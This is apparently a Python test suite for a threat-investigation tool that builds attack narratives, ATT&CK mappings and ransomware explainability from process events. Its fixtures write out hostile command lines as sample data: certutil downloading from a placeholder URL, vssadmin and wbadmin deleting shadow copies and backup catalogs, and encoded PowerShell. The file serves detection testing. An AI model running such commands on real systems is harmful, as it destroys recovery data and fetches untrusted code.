"""Phase 2 tests · attack_story · attack_mapping · explainability."""
from __future__ import annotations
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from v2.investigation import build_investigation
from v2.investigation.explainability import why_is_this_not, ATTACK_PATTERNS


def _f(fid, ts, lane, label, cmdline="", mitre=None, action=None,
       target=None, rule_id=None):
    return {
        "frame_iid": fid, "ts": ts, "lane": lane, "label": label,
        "action":  action or cmdline or label, "cmdline": cmdline,
        "target":  target, "mitre":  mitre or [], "rule_id": rule_id,
    }


# ═══ Attack Story ══════════════════════════════════════════════════════

def test_story_emits_office_lolbin_sentence():
    frames = [
        _f("f1", "2026-02-24T10:00:00Z", "process", "winword.exe",
           cmdline="WINWORD.EXE Invoice.docm"),
        # Use a plain regsvr32.exe cmdline — the _bin() regex grabs the
        # first `.exe/.dll` it sees so we keep the payload URL clean.
        {"frame_iid": "f2", "ts": "2026-02-24T10:00:05Z",
         "lane": "process", "label": "regsvr32.exe",
         "action": "regsvr32.exe /s /n /u",
         "cmdline": "regsvr32.exe /s /n /u",
         "mitre": ["T1218"],
         "parent": {"iid": "proc:winword.exe", "name": "winword.exe", "type": "process"}},
    ]
    inv = build_investigation(frames, case_id="story1")
    assert inv.story, "expected at least one story sentence"
    texts = " ".join(s["text"] for s in inv.story).lower()
    assert "winword" in texts and "regsvr32" in texts, texts

def test_story_is_deterministic():
    frames = [
        _f("s1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AAAAAAAAAAAAAAAAAAAAAA", mitre=["T1027"]),
    ]
    a = build_investigation(frames, case_id="det").story
    for _ in range(15):
        b = build_investigation(frames, case_id="det").story
        assert a == b, "story generator is non-deterministic"

def test_story_sentence_carries_evidence_links():
    frames = [
        _f("st1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1027"]),
    ]
    inv = build_investigation(frames, case_id="link")
    if inv.story:
        s = inv.story[0]
        assert "frame_iids" in s and "process_iids" in s and "signals" in s
        assert "evidence_ref" in s and s["evidence_ref"]


# ═══ ATT&CK mapping ═════════════════════════════════════════════════════

def test_attack_mapping_populates_tactics_and_navigator():
    frames = [
        _f("m1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1059", "T1027"]),
        _f("m2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
           cmdline="certutil -urlcache -split http://x/", mitre=["T1105"]),
        _f("m3", "2026-02-24T10:00:10Z", "process", "wbadmin.exe",
           cmdline="wbadmin delete catalog -quiet", mitre=["T1490"]),
    ]
    inv = build_investigation(frames, case_id="am")
    am = inv.attack_mapping
    assert am["coverage_summary"]["unique_techniques"] >= 3
    assert am["coverage_summary"]["unique_tactics"]    >= 3
    # Navigator layer conforms to Navigator v4.5 minimum schema.
    nav = am["navigator"]
    assert nav["domain"] == "enterprise-attack"
    assert nav["version"] == "4.5"
    assert len(nav["techniques"]) >= 3
    # Kill chain contains every canonical tactic and marks the observed ones covered.
    covered = [k for k in am["kill_chain"] if k["covered"]]
    assert len(covered) >= 3

def test_attack_mapping_deterministic():
    frames = [
        _f("d1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1027"]),
    ]
    a = build_investigation(frames, case_id="det").attack_mapping
    for _ in range(15):
        b = build_investigation(frames, case_id="det").attack_mapping
        assert a == b


# ═══ Explainability · positive ═════════════════════════════════════════

def test_positive_explainability_populated():
    frames = [
        _f("p1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1027", "T1059"]),
        _f("p2", "2026-02-24T10:00:05Z", "process", "certutil.exe",
           cmdline="certutil -urlcache -split http://x/", mitre=["T1105"]),
    ]
    inv = build_investigation(frames, case_id="pos")
    pos = inv.explainability["positive"]
    assert pos["band"] in ("suspicious", "malicious", "critical", "low")
    assert pos["reasons"], "positive explainability should have reasons"


# ═══ Explainability · negative ═════════════════════════════════════════

def test_negative_ransomware_missing_when_no_impact():
    """No BACKUP_DESTRUCTION / MASS_ENCRYPT / RANSOM_NOTE → matches=False."""
    frames = [
        _f("n1", "2026-02-24T10:00:00Z", "process", "powershell.exe",
           cmdline="powershell.exe -EncodedCommand AA==", mitre=["T1027"]),
    ]
    inv = build_investigation(frames, case_id="notrans")
    dv = (inv.verdicts or {}).get("device") or {}
    r = why_is_this_not("ransomware", dv)
    assert r["matches"] is False
    assert set(r["missing_required"]) == set(ATTACK_PATTERNS["ransomware"]["required"].keys())
    assert any(x["kind"] == "missing" for x in r["reasons"])

def test_negative_ransomware_matches_when_impact_present():
    frames = [
        _f("r1", "2026-02-24T10:00:00Z", "process", "wbadmin.exe",
           cmdline="wbadmin delete catalog -quiet", mitre=["T1490"]),
        _f("r2", "2026-02-24T10:00:05Z", "process", "vssadmin.exe",
           cmdline="vssadmin delete shadows /all /quiet", mitre=["T1490"]),
        _f("r3", "2026-02-24T10:00:10Z", "file", "readme.txt",
           action="write C:\\Users\\Public\\readme.txt",
           target="C:\\Users\\Public\\readme.txt"),
    ]
    inv = build_investigation(frames, case_id="ransom")
    dv = (inv.verdicts or {}).get("device") or {}
    r = why_is_this_not("ransomware", dv)
    # We fire BACKUP_DESTRUCTION + SHADOW_COPY_DELETE + RANSOM_NOTE_CREATION.
    # min_required = 2 → matches must be True.
    assert r["matches"] is True, r

def test_unknown_pattern_returns_error_reason():
    r = why_is_this_not("timetravel", {"signals": []})
    assert r["matches"] is False
    assert any(x["kind"] == "error" for x in r["reasons"])


if __name__ == "__main__":
    fns = [(n, f) for n, f in list(globals().items()) if n.startswith("test_")]
    ok, fail = 0, 0
    for name, fn in fns:
        try:
            fn()
            print(f"  ✓ {name}")
            ok += 1
        except AssertionError as e:
            print(f"  ✗ {name} · {e}")
            fail += 1
        except Exception as e:
            print(f"  ✗ {name} · {type(e).__name__}: {e}")
            fail += 1
    print(f"\n{ok}/{ok+fail} passed")
    sys.exit(0 if fail == 0 else 1)
